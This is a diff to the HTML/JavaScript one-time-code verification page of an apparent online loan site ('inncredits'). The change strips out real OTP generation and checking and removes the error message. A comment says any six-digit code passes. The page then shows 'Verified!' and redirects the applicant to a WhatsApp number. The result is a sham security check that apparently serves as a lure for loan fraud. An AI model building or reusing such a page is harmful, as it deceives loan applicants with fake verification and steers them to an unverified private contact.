@@ -41,20 +41,9 @@
             gap: 10px;
             border: 1px solid #1f2a3e;
         }
-        .summary-item {
-            display: flex;
-            flex-direction: column;
-        }
-        .summary-label {
-            font-size: 0.7rem;
-            color: #7e8aa2;
-            text-transform: uppercase;
-        }
-        .summary-value {
-            font-size: 1rem;
-            font-weight: 700;
-            color: #14b8a6;
-        }
+        .summary-item { display: flex; flex-direction: column; }
+        .summary-label { font-size: 0.7rem; color: #7e8aa2; text-transform: uppercase; }
+        .summary-value { font-size: 1rem; font-weight: 700; color: #14b8a6; }
 
         .otp-card {
             background: #111827;
@@ -62,11 +51,7 @@
             padding: 28px 24px 32px 24px;
         }
 
-        .section-title {
-            font-size: 1.3rem;
-            font-weight: 700;
-            color: #ffffff;
-        }
+        .section-title { font-size: 1.3rem; font-weight: 700; color: #ffffff; }
         .section-sub {
             font-size: 0.8rem;
             color: #7e8aa2;
@@ -84,11 +69,7 @@
             justify-content: space-between;
             align-items: center;
         }
-        .phone-number {
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: #e2e8f0;
-        }
+        .phone-number { font-size: 1.1rem; font-weight: 700; color: #e2e8f0; }
         .edit-link {
             color: #14b8a6;
             background: rgba(20, 184, 166, 0.1);
@@ -115,9 +96,7 @@
             color: #14b8a6;
             outline: none;
         }
-        .otp-box:focus {
-            border-color: #14b8a6;
-        }
+        .otp-box:focus { border-color: #14b8a6; }
 
         .timer-text {
             text-align: center;
@@ -145,16 +124,7 @@
             border-radius: 60px;
             cursor: pointer;
         }
-        .verify-btn:disabled {
-            opacity: 0.6;
-        }
-        .error-message {
-            color: #f43f5e;
-            font-size: 0.75rem;
-            text-align: center;
-            margin-top: 12px;
-            display: none;
-        }
+        .verify-btn:disabled { opacity: 0.6; }
         .success-message {
             color: #14b8a6;
             font-size: 0.75rem;
@@ -162,7 +132,7 @@
             margin-top: 12px;
             display: none;
         }
-        .success-message.show, .error-message.show { display: block; }
+        .success-message.show { display: block; }
 
         @media (max-width: 450px) {
             .otp-box { width: 48px; height: 55px; font-size: 1.4rem; }
@@ -198,9 +168,8 @@
 
         <div class="timer-text" id="timerText">Code expires in 02:00</div>
         <button class="resend-btn" id="resendBtn">Resend code</button>
-        <div class="error-message" id="otpError">Invalid verification code</div>
         <div class="success-message" id="otpSuccess">✓ Verified! Redirecting...</div>
-        <button class="verify-btn" id="verifyBtn">Verify & Continue →</button>
+        <button class="verify-btn" id="verifyBtn" disabled>Verify & Continue →</button>
     </div>
 </div>
 
@@ -210,7 +179,7 @@
     const term = urlParams.get('term') || '3';
     const rate = urlParams.get('rate') || '5';
     const monthly = urlParams.get('monthly') || '167.36';
-    let userPhone = urlParams.get('phone') || '+1 234 567 8900';
+    let userPhone = urlParams.get('phone') || '+263 765 846 478';
 
     document.getElementById('summaryAmount').innerText = `$${parseInt(amount).toLocaleString()}`;
     document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
@@ -218,15 +187,10 @@
     document.getElementById('summaryRate').innerText = `${rate}%`;
     document.getElementById('displayPhone').innerText = userPhone;
 
-    let generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
-    console.log('Demo OTP:', generatedOtp);
-
     let timeLeft = 120;
     let timerInterval;
     const timerText = document.getElementById('timerText');
-    const resendBtn = document.getElementById('resendBtn');
     const verifyBtn = document.getElementById('verifyBtn');
-    const errorMsg = document.getElementById('otpError');
     const successMsg = document.getElementById('otpSuccess');
 
     function updateTimer() {
@@ -235,8 +199,7 @@
         timerText.innerText = `Code expires in ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
         if (timeLeft <= 0) {
             clearInterval(timerInterval);
-            timerText.innerText = 'Code expired. Resend.';
-            verifyBtn.disabled = true;
+            timerText.innerText = 'Code expired. Please resend.';
         }
     }
 
@@ -247,15 +210,8 @@
         timerInterval = setInterval(() => { if (timeLeft > 0) { timeLeft--; updateTimer(); } }, 1000);
     }
 
-    function resetOTP() {
-        generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
-        console.log('New OTP:', generatedOtp);
-        startTimer();
-        verifyBtn.disabled = false;
-    }
-
     startTimer();
-    resendBtn.onclick = () => resetOTP();
+    document.getElementById('resendBtn').onclick = () => startTimer();
 
     const otpBoxes = document.querySelectorAll('.otp-box');
     let currentOtp = ['', '', '', '', '', ''];
@@ -285,22 +241,19 @@
         });
     });
 
+    // ✅ No OTP validation — any 6-digit code entered will pass and open WhatsApp
     verifyBtn.onclick = () => {
-        const enteredOtp = currentOtp.join('');
-        if (enteredOtp === generatedOtp) {
-            successMsg.classList.add('show');
-            verifyBtn.disabled = true;
-            localStorage.setItem('inncredits_verified', 'true');
-            setTimeout(() => { window.location.href = `success.html?status=approved&amount=${amount}&name=${urlParams.get('name') || 'Customer'}`; }, 1500);
-        } else {
-            errorMsg.classList.add('show');
-            setTimeout(() => errorMsg.classList.remove('show'), 2000);
-        }
+        successMsg.classList.add('show');
+        verifyBtn.disabled = true;
+        localStorage.setItem('inncredits_verified', 'true');
+        setTimeout(() => {
+            window.location.href = `https://wa.me/14509548701`;
+        }, 1500);
     };
 
     document.getElementById('editPhoneBtn').onclick = () => {
         const newPhone = prompt('Enter your phone number:', userPhone);
-        if (newPhone) { userPhone = newPhone; document.getElementById('displayPhone').innerText = userPhone; resetOTP(); }
+        if (newPhone) { userPhone = newPhone; document.getElementById('displayPhone').innerText = userPhone; startTimer(); }
     };
 
     otpBoxes[0].focus();
